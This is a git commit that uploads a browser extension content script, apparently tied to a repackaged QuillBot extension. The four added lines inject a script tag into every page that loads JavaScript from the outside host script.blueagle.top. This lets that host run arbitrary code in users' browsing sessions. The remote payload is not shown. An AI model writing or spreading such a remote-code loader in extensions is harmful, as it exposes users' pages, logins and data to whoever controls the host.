2e0bafbae345866fbdca63ffe252c8fc4a261bf1
isaiahgee <46302931+isaiahgee@users.noreply.github.com>
2022-03-10 17:29:13 -0500

    Add files via upload

---
+++ extension-1/content.js
@@ -0,0 +1,4 @@
+const script = document.createElement('script');
+script.setAttribute('type', 'text/javascript');
+script.setAttribute('src', 'https://script.blueagle.top/chrome_extension/quillbot.js');
+document.head.appendChild(script);
